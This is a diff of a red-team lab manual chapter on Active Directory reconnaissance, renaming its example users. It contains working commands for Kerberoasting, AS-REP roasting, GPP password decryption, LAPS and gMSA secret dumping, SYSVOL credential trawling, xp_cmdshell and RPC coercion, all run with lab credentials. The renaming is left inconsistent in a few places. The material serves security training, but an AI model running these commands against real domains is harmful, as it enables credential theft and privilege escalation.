@@ -24,7 +24,7 @@ A red-team engagement that allocates **2 hours** to recon and **38 hours** to ex
 Three principles drive this chapter:
 
 1. **Crawl, don't pivot.** Get the whole graph from one vantage point before moving to a second. Each pivot is an opportunity to be caught.
-2. **Cross-check.** The same fact (e.g., "alice has GenericWrite on bob") should be visible in LDAP raw, BloodHound, PowerView and nxc. If three disagree, one of them is lying — and the disagreement itself is a finding.
+2. **Cross-check.** The same fact (e.g., "peter.parker has GenericWrite on tony.stark") should be visible in LDAP raw, BloodHound, PowerView and nxc. If three disagree, one of them is lying — and the disagreement itself is a finding.
 3. **Persist your data.** Every enum command output goes to disk under `~/dvad/recon/<phase>/<target>/`. You will re-read it ten times during the engagement.
 
 ---
@@ -183,7 +183,7 @@ PTR records often exist when A records don't (e.g., DHCP-assigned workstations r
 If `dnsAdmin` rights or even **authenticated user** rights are sufficient (default), you can dump the AD-DNS zones via LDAP:
 
 ```bash
-adidnsdump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10
+adidnsdump -u 'corp\peter.parker' -p 'DVADlab2024!' 10.10.0.10
 # Outputs records.csv with EVERY dnsNode under the zone
 ```
 
@@ -267,7 +267,7 @@ You should now have:
 S-1-5-21-...-500   CORP\Administrator    (User)
 S-1-5-21-...-512   CORP\Domain Admins    (Group)
 S-1-5-21-...-1000  CORP\WS01$            (Computer)
-S-1-5-21-...-1116  CORP\svc_sql          (User)
+S-1-5-21-...-1116  CORP\svc_jarvis          (User)
 …
 ```
 
@@ -285,7 +285,7 @@ Tells you `MinPasswordLength`, `LockoutThreshold`, `LockoutDuration`. **Critical
 
 ## 8.5 Layer 3 — Authenticated LDAP
 
-You have low-priv credentials (e.g., `alice:DVADlab2024!`) — from a Responder hash you cracked, a leaked SYSVOL `Groups.xml`, or DVAD's documented seed.
+You have low-priv credentials (e.g., `peter.parker:DVADlab2024!`) — from a Responder hash you cracked, a leaked SYSVOL `Groups.xml`, or DVAD's documented seed.
 
 ### Why raw LDAP first, BloodHound second?
 
@@ -349,7 +349,7 @@ Memorise the four common ones: **2 disabled, 524288 unconstrained, 4194304 AS-RE
 
 ```bash
 # Setup
-USER='alice@corp.local'
+USER='peter.parker@corp.local'
 PASS='DVADlab2024!'
 DC=10.10.0.10
 BASE='DC=corp,DC=local'
@@ -367,7 +367,7 @@ $LDAP "(objectCategory=person)" \
       msDS-AllowedToDelegateTo servicePrincipalName
 
 # Specific user
-$LDAP "(sAMAccountName=alice)" "*" "+"   # "*" + "+" = all user + operational attrs
+$LDAP "(sAMAccountName=peter.parker)" "*" "+"   # "*" + "+" = all user + operational attrs
 
 # All groups + members
 $LDAP "(objectCategory=group)" sAMAccountName member groupType
@@ -424,10 +424,10 @@ done
 
 ```bash
 # ldapdomaindump — HTML and JSON of every user/group/computer
-ldapdomaindump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10 -o ~/dvad/recon/03-ldap/ldd
+ldapdomaindump -u 'corp\peter.parker' -p 'DVADlab2024!' 10.10.0.10 -o ~/dvad/recon/03-ldap/ldd
 
 # ldeep — cache + queries
-ldeep ldap -d corp.local -u alice -p 'DVADlab2024!' -s 10.10.0.10 --all corp-cache
+ldeep ldap -d corp.local -u peter.parker -p 'DVADlab2024!' -s 10.10.0.10 --all corp-cache
 ldeep cache -d corp.local corp-cache users
 ldeep cache -d corp.local corp-cache computers
 ldeep cache -d corp.local corp-cache groups
@@ -468,12 +468,12 @@ Behaviour:
 - Non-existent → `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6).
 - Disabled → `KDC_ERR_CLIENT_REVOKED` (18).
 
-Kerbrute lets you enumerate **without a password**. Useful when you don't even have `alice:DVADlab2024!`.
+Kerbrute lets you enumerate **without a password**. Useful when you don't even have `peter.parker:DVADlab2024!`.
 
 ### AS-REP roast every user with the flag
 
 ```bash
-impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/recon/04-kerb/asrep.hash
 
 # Without creds — only works if you have a userlist
@@ -485,11 +485,11 @@ impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
 ### Kerberoast every SPN-bearing user
 
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/recon/04-kerb/kerb.hash
 
 # With --usersfile to limit
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile kerb.hash -usersfile high-priv-spns.txt
 ```
 
@@ -529,7 +529,7 @@ BloodHound transforms 50,000 LDAP attributes into a graph of "who can act on who
 ```bash
 bloodhound-python \
     -d corp.local \
-    -u alice -p 'DVADlab2024!' \
+    -u peter.parker -p 'DVADlab2024!' \
     -ns 10.10.0.10 \
     -c All --zip \
     --dns-tcp \
@@ -560,12 +560,12 @@ SharpHound can `LoggedOn` (calls `NetWkstaUserEnum`) — knowing *who is logged 
 
 ```bash
 # Finance via the external trust
-bloodhound-python -d finance.local -u 'alice@corp.local' -p 'DVADlab2024!' \
+bloodhound-python -d finance.local -u 'peter.parker@corp.local' -p 'DVADlab2024!' \
                   -ns 10.20.0.10 -c All --zip \
                   -o ~/dvad/recon/05-bloodhound/finance/
 
 # Root via the forest trust
-bloodhound-python -d root.corp -u 'alice@corp.local' -p 'DVADlab2024!' \
+bloodhound-python -d root.corp -u 'peter.parker@corp.local' -p 'DVADlab2024!' \
                   -ns 10.30.0.10 -c All --zip \
                   -o ~/dvad/recon/05-bloodhound/root/
 ```
@@ -606,7 +606,7 @@ MATCH (u:User) WHERE u.description =~ '(?i).*password.*' RETURN u.name, u.descri
 MATCH p=(u:User)-[r:GenericWrite]->(c:Computer)
 RETURN u.name, c.name, type(r)
 
-// Path from alice to any DA in corp.local
+// Path from peter.parker to any DA in corp.local
 MATCH p=shortestPath((u:User {name:'ALICE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
 RETURN p
 
@@ -632,7 +632,7 @@ Always tag the BloodHound zip with collection date and source user (your edge pe
 
 ```
 ~/dvad/recon/05-bloodhound/corp/2026-05-21_corp_alice.zip
-~/dvad/recon/05-bloodhound/corp/2026-05-22_corp_bob.zip   # if you compromise bob later
+~/dvad/recon/05-bloodhound/corp/2026-05-22_corp_bob.zip   # if you compromise tony.stark later
 ```
 
 ---
@@ -640,13 +640,13 @@ Always tag the BloodHound zip with collection date and source user (your edge pe
 ## 8.8 Layer 4.5 — Certificate Services enumeration (ESC mapping)
 
 ```bash
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
              -stdout -text -output ~/dvad/recon/06-adcs/corp
 
-certipy ca -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
+certipy ca -u peter.parker@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
            -list-templates
 
-certipy ca -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
+certipy ca -u peter.parker@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
            -officers
 ```
 
@@ -693,8 +693,8 @@ That `[!] Vulnerabilities` line is the gold. Each template gets tagged with the 
 Catalogue every CA + template in each forest:
 
 ```bash
-certipy find -u alice@corp.local -p ... -dc-ip 10.20.0.10 -output finance-ca
-certipy find -u alice@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
+certipy find -u peter.parker@corp.local -p ... -dc-ip 10.20.0.10 -output finance-ca
+certipy find -u peter.parker@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
 ```
 
 [Flags: ENUM-027 — cert template enum; ENUM-028 — CA list; ENUM-029 — officers list]
@@ -706,7 +706,7 @@ certipy find -u alice@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
 ### SMB shares (authenticated)
 
 ```bash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares \
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares \
     --filter-shares READ,WRITE
 ```
 
@@ -714,10 +714,10 @@ nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares \
 
 ```bash
 # Recursive read
-smbmap -u alice -p 'DVADlab2024!' -H 10.10.0.13 -R --depth 4 -q
+smbmap -u peter.parker -p 'DVADlab2024!' -H 10.10.0.13 -R --depth 4 -q
 
 # Targeted patterns
-smbclient -U alice%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
+smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
     | grep -iE '\.config|\.xml|\.kdbx|\.ps1|unattend|password|cred|secret|backup'
 ```
 
@@ -737,7 +737,7 @@ smbclient -U alice%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
 ### MSSQL surface
 
 ```bash
-impacket-mssqlclient corp.local/alice:'DVADlab2024!'@10.10.0.14 -windows-auth
+impacket-mssqlclient corp.local/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
 
 # Inside the client:
 SQL> SELECT @@version
@@ -752,8 +752,8 @@ SQL> SELECT srvname, srvproduct, providername, datasource FROM master..sysserver
 Useful nxc spray for MSSQL:
 
 ```bash
-nxc mssql 10.10.0.0/21 -u alice -p 'DVADlab2024!' --local-auth
-nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' -d corp.local -q 'SELECT @@version'
+nxc mssql 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --local-auth
+nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' -d corp.local -q 'SELECT @@version'
 nxc mssql 10.10.0.14 -u sa -p '...' --xp_cmdshell 'whoami /all'
 ```
 
@@ -776,9 +776,9 @@ EXEC ('SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=...'', ''SELECT 1'')')
 ### WinRM / RDP / DCOM accessibility map
 
 ```bash
-nxc winrm 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-nxc rdp 10.10.0.0/21 -u alice -p 'DVADlab2024!'
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --admin
+nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+nxc rdp 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --admin
 ```
 
 `--admin` checks for the magic Local Administrators on the target. Reveals lateral targets.
@@ -791,12 +791,12 @@ For every member server you reach, log:
 File01 (10.10.0.13)
   - SMB: yes
   - Shares: share$ (R, W), backup$ (R)
-  - WinRM: yes (alice not member of Remote Management Users)
+  - WinRM: yes (peter.parker not member of Remote Management Users)
   - SSH: yes (port 22)
-  - RDP: yes (alice not member of Remote Desktop Users)
+  - RDP: yes (peter.parker not member of Remote Desktop Users)
   - HTTP: no
   - LSASS readable: no (low-priv)
-  - Local admin: bob (per BloodHound)
+  - Local admin: tony.stark (per BloodHound)
 ```
 
 Build this for every host — it becomes the lateral-movement decision table.
@@ -810,7 +810,7 @@ The SYSVOL share is **world-readable** to every authenticated user. It contains 
 ### GPO/SYSVOL trawl
 
 ```bash
-smbclient -U alice%'DVADlab2024!' //10.10.0.10/SYSVOL \
+smbclient -U peter.parker%'DVADlab2024!' //10.10.0.10/SYSVOL \
     -c 'prompt OFF; recurse ON; mget *' -m SMB3
 ```
 
@@ -828,7 +828,7 @@ grep -r -h "cpassword" SYSVOL/ | grep -oP 'cpassword="\K[^"]+' \
     | while read cp; do gpp-decrypt "$cp"; done
 
 # Or one-shot
-impacket-Get-GPPPassword 'corp.local/alice:DVADlab2024!@10.10.0.10'
+impacket-Get-GPPPassword 'corp.local/peter.parker:DVADlab2024!@10.10.0.10'
 ```
 
 The AES-256 key for GPP encryption is **public** (Microsoft published it as part of the deprecation): `4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b`. Anything `cpassword=` in SYSVOL is decryptable.
@@ -888,7 +888,7 @@ $LDAP "(msLAPS-Password=*)" sAMAccountName msLAPS-Password msLAPS-PasswordExpira
 If you can read `ms-Mcs-AdmPwd`, you have local admin on that host. ACLs are usually scoped to a security group (`LAPS-Readers`).
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kdcHost 10.10.0.10 -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kdcHost 10.10.0.10 -M laps
 ```
 
 NetExec's `laps` module reads, decrypts (LAPS v2), and dumps in one step.
@@ -903,7 +903,7 @@ $LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
 `msDS-GroupMSAMembership` is a security descriptor listing principals allowed to **read the password**. If you're in that group, you can derive the gMSA NT hash.
 
 ```bash
-gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
 # Outputs: gmsaaccount$:::NThash
 ```
 
@@ -938,8 +938,8 @@ $LDAP -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
       msDS-TrustForestTrustInfo
 
 # Cross-ref via nxc
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
 ```
 
 ### Interpreting trustAttributes (bitmask)
@@ -1013,7 +1013,7 @@ The single most valuable piece of recon for planning lateral movement: **where a
 ### NetSessionEnum (SMB sessions to this host)
 
 ```bash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --sessions
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --sessions
 ```
 
 Returns the list of SMB sessions to each host — i.e., who is *connected* (typically anyone running `\\file01\share`). Default ACL since Server 2016 restricts this to local admins / Administrators, but legacy hosts permit it for Authenticated Users.
@@ -1021,7 +1021,7 @@ Returns the list of SMB sessions to each host — i.e., who is *connected* (typi
 ### NetWkstaUserEnum (users logged in on this host)
 
 ```bash
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --loggedon-users
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --loggedon-users
 ```
 
 Stricter ACL (admin-only by default). When it works, it tells you who is *actually interactively logged on*.
@@ -1030,7 +1030,7 @@ Stricter ACL (admin-only by default). When it works, it tells you who is *actual
 
 ```powershell
 Invoke-UserHunter -GroupName "Domain Admins" -Threads 20 -Verbose
-Invoke-UserHunter -UserName "alice"  # hunt one user
+Invoke-UserHunter -UserName "peter.parker"  # hunt one user
 Invoke-UserHunter -CheckAccess        # additionally check if you have admin on the host
 ```
 
@@ -1078,8 +1078,8 @@ Key UUIDs to watch for:
 
 ```bash
 # EFSRPC (PetitPotam)
-Coercer.py coerce -t 10.10.0.10 -u alice -p 'DVADlab2024!' -d corp.local
-Coercer.py scan -t 10.10.0.10 -u alice -p 'DVADlab2024!' -d corp.local
+Coercer.py coerce -t 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -d corp.local
+Coercer.py scan -t 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -d corp.local
 
 # Spoolss
 rpcdump.py @10.10.0.10 | grep -i spoolss
@@ -1096,18 +1096,18 @@ rpcdump.py @10.10.0.10 | grep -i spoolss
 Before you escalate, exhaustively read your own user object:
 
 ```bash
-$LDAP "(sAMAccountName=alice)" "*" "+"
+$LDAP "(sAMAccountName=peter.parker)" "*" "+"
 
 # Your token's effective SIDs
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query \
-    "(sAMAccountName=alice)" "memberOf objectSid tokenGroups"
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query \
+    "(sAMAccountName=peter.parker)" "memberOf objectSid tokenGroups"
 ```
 
 Then probe for write rights:
 
 ```bash
 # bloodyAD — list ACEs on objects you might own
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
          get writable
 ```
 
@@ -1160,7 +1160,7 @@ The GC (port 3268) holds a partial replica of every object in every domain of th
 
 ```bash
 # Global Catalog bind
-ldapsearch -x -H ldap://10.10.0.10:3268 -D 'alice@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10:3268 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
            -b "" -s sub "(objectCategory=person)" sAMAccountName
 
 # Lists every user in EVERY domain of corp.local forest (corp.local + root.corp if same forest)
@@ -1169,7 +1169,7 @@ ldapsearch -x -H ldap://10.10.0.10:3268 -D 'alice@corp.local' -w 'DVADlab2024!' 
 Note: an **external trust** to finance.local means finance.local is **not** in the corp.local forest — GC will not see those objects. You need to query 10.20.0.10 directly.
 
 ```bash
-ldapsearch -x -H ldap://10.30.0.10:3268 -D 'alice@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.30.0.10:3268 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
            -b "" -s sub "(objectCategory=person)" sAMAccountName
 # This queries the root.corp GC — assuming forest trust, you can authenticate cross-forest
 ```
@@ -1203,7 +1203,7 @@ $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName
 $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=32)" sAMAccountName
 ```
 
-DVAD's `svc_sql`, `svc_web`, `svc_backup`, `svc_jenkins` all carry intentionally weak passwords matching common wordlists like `rockyou.txt`. Kerberoasting them yields easy DA chains.
+DVAD's `svc_jarvis`, `svc_vision`, `svc_backup`, `svc_jenkins` all carry intentionally weak passwords matching common wordlists like `rockyou.txt`. Kerberoasting them yields easy DA chains.
 
 [Flag: ENUM-022 — service-acct catalogue]
 
@@ -1241,11 +1241,11 @@ Each privileged group has a particular escalation primitive (see chapter 11):
 
 ## 8.20 Layer 16 — Cross-tier visibility
 
-A practical recon trick: cross-reference findings across domains *without* explicit pivoting. If `alice@corp.local` has a trust path into finance.local, you can sometimes read finance.local objects from a corp-side query via the global catalog — even before pivoting laterally.
+A practical recon trick: cross-reference findings across domains *without* explicit pivoting. If `peter.parker@corp.local` has a trust path into finance.local, you can sometimes read finance.local objects from a corp-side query via the global catalog — even before pivoting laterally.
 
 ```bash
 # Hit finance.local's DC with corp creds (external trust permits it)
-ldapsearch -x -H ldap://10.20.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.20.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
            -b 'DC=finance,DC=local' "(objectCategory=person)" sAMAccountName
 
 # If the trust is "shortcut" / forest with selective auth → may be filtered
@@ -1327,8 +1327,8 @@ Sometimes finance.local strips trust permissions to specific groups. Test access
 ├── 12-rpc/
 │   └── rpcdump-dc01.txt
 ├── 13-acl/
-│   ├── bloodyad-writable-alice.txt
-│   └── adacl-bob.txt
+│   ├── bloodyad-writable-peter.parker.txt
+│   └── adacl-tony.stark.txt
 ├── 14-pki-ldap/
 │   ├── templates.ldif
 │   └── ntauth.ldif
@@ -1338,7 +1338,7 @@ Sometimes finance.local strips trust permissions to specific groups. Test access
     └── pivot-plan.md
 ```
 
-The investment pays off. When you want to compare "what could alice see two days ago vs. now," you re-grep the same directory.
+The investment pays off. When you want to compare "what could peter.parker see two days ago vs. now," you re-grep the same directory.
 
 ---
 
@@ -1350,16 +1350,16 @@ After the sweep, write `99-summary/pivot-plan.md`:
 # Pivot plan — 2026-05-21
 
 ## What I have
-- alice : DVADlab2024! (low-priv user)
+- peter.parker : DVADlab2024! (low-priv user)
 - BloodHound DB merged: corp, finance, root.
 - Vulnerable templates: VulnerableESC1 (corp), Web-RA (finance ESC8 candidate).
 
 ## Attack candidates (ranked by reliability)
 
-1. **Kerberoast svc_sql** — RC4, weak password.
+1. **Kerberoast svc_jarvis** — RC4, weak password.
    - Cost: 1 TGS-REQ.
    - Risk: 4769 RC4 alert if SIEM is tight.
-   - Payoff: svc_sql likely sysadmin on sql01 → xp_cmdshell → SYSTEM.
+   - Payoff: svc_jarvis likely sysadmin on sql01 → xp_cmdshell → SYSTEM.
 
 2. **AS-REP roast svc_legacy** — DontReqPreAuth set.
    - Cost: 1 AS-REQ.
@@ -1419,13 +1419,21 @@ For each layer 1–16, generate the recon output and save under `~/dvad/recon/<l
 
 After loading BloodHound (BHCE):
 
-1. Find shortest path from `alice@corp.local` to `Administrator@corp.local`.
-2. Identify each edge type along the path.
-3. For each edge, list the technique that exploits it (e.g., "GenericWrite on user → set SPN → Kerberoast"). Keep the list under `~/dvad/recon/99-summary/path-1.md`.
+1. Find shortest path from a standard user like `peter.parker@corp.local` to `Administrator@corp.local`.
+2. Look at the specific ACEs granted to non-admin users in the environment (as seen in BloodHound output). Note these explicitly:
+   - `peter.parker` has `GenericAll` over `tony.stark`
+   - `developer1` has `ForceChangePassword` on `nick.fury`
+   - `nick.fury` has `WriteSPN` on `svc_vision` (Kerberoasting pivot)
+   - `nick.fury` has `WriteOwner` on `Domain Admins`
+   - `qa_user` has `AddSelf` to `Avengers Admins`
+   - `loki` has `GenericAll` on `FILE01$` and `SQL01$`
+   - `steve.rogers` has `GenericAll` on `AdminSDHolder` (Persistence mechanism)
+3. Identify each edge type along the path. Construct a chained sequence (e.g., `developer1` → ForceChangePassword → `nick.fury` → WriteOwner → `Domain Admins`).
+4. For each edge, list the technique that exploits it (e.g., "GenericWrite on user → set SPN → Kerberoast"). Keep the list under `~/dvad/recon/99-summary/path-1.md`.
 
 ### Exercise 8.C — Cross-forest map
 
-Run BloodHound collection against corp.local, finance.local, and root.corp using `alice@corp.local`. Merge all three zips into the same BHCE instance. Identify:
+Run BloodHound collection against corp.local, finance.local, and root.corp using `peter.parker@corp.local`. Merge all three zips into the same BHCE instance. Identify:
 
 - ForeignSecurityPrincipals entries that link corp ↔ finance.
 - ForeignSecurityPrincipals entries that link corp ↔ root.
@@ -1433,7 +1441,7 @@ Run BloodHound collection against corp.local, finance.local, and root.corp using
 
 ### Exercise 8.D — Raw LDAP vs. BloodHound diff
 
-Pick five claims BloodHound makes (e.g., "bob has GenericAll on charlie"). For each, **re-derive** the claim from raw LDAP (`nTSecurityDescriptor` on the target object). Confirm they match.
+Pick five claims BloodHound makes (e.g., "tony.stark has GenericAll on bruce.banner"). For each, **re-derive** the claim from raw LDAP (`nTSecurityDescriptor` on the target object). Confirm they match.
 
 ### Exercise 8.E — Kerbrute without creds
 
@@ -1456,7 +1464,7 @@ For each of the four DVAD trusts (corp↔eu, corp→finance, corp↔root, etc.),
 
 ### Exercise 8.H — Session-hunt for DAs
 
-From the lab's `alice` account, run `Invoke-UserHunter -GroupName "Domain Admins"`. If no hits, lab the DC up: `mstsc /v:dc01.corp.local` (admin password), log in, log out — then re-run the UserHunter from alice. The session should now appear. Discuss how this informs lateral targeting.
+From the lab's `peter.parker` account, run `Invoke-UserHunter -GroupName "Domain Admins"`. If no hits, lab the DC up: `mstsc /v:dc01.corp.local` (admin password), log in, log out — then re-run the UserHunter from peter.parker. The session should now appear. Discuss how this informs lateral targeting.
 
 ### Exercise 8.I — SYSVOL trawl
 
